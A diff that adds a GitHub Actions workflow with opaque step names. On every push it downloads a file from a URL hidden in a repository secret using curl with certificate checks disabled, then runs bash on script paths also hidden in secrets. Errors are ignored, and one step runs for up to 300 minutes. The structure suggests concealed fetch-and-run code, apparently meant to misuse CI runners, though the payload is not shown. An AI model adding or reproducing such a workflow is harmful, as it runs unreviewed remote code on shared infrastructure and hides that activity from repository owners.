@@ -1,0 +1,29 @@
+name: eart
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: eart1
+       uses: actions/checkout@main
+
+     - name: eart2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EA_AB }}
+             bash ${{ secrets.EA_CD }}
+     - name: eart3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EA_EF }}
+     - name: eart4
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EA_GH }}
